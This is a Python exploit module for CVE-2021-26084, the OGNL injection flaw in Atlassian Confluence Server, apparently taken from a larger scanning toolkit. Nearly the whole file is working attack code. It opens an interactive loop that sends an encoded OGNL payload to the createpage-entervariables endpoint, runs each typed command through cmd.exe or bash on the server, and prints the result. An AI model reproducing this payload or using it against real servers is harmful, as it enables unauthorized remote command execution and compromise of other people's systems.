#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests,urllib3
from bs4 import BeautifulSoup
from pub.com.outprint import OutPrintInfo
from pub.com.reqset import ReqSet
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class Cve_2021_26084:
    def banner(self):

        print('---------------------------------------------------------------')
        print('[-] Confluence Server Webwork OGNL injection')
        print('[-] CVE-2021-26084')
        print('[-] https://github.com/h3v0x')
        print('--------------------------------------------------------------- ')

    def cmdExec(self,url):
        session = requests.Session()
        endpoint = "/pages/createpage-entervariables.action?SpaceKey=x"
        while True:
            cmd = input('> ')
            if cmd == "exit":
                break
            xpl_url = url + endpoint
            xpl_headers = {
                "User-Agent": self.headers,
                "Connection": "close",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept-Encoding": "gzip, deflate"}
            xpl_data = {
                "queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022" + cmd + "\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}
            try:
                rawHTML = session.post(xpl_url, headers=xpl_headers, data=xpl_data, verify=self.ssl,proxies=self.proxy)

                soup = BeautifulSoup(rawHTML.text, 'html.parser')
                queryStringValue = soup.find('input', attrs={'name': 'queryString', 'type': 'hidden'})['value']
                OutPrintInfo("Atlassian",queryStringValue)
                # print(queryStringValue)
            except Exception:
                pass

    def main(self, target):
        OutPrintInfo("Atlassian", '开始执行Atlassian Confluence CVE-2021-26084漏洞...')
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.headers = target["header"]
        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy)
        self.banner()
        self.cmdExec(url)

        OutPrintInfo("Atlassian", 'Atlassian Confluence CVE-2021-26084漏洞检测结束')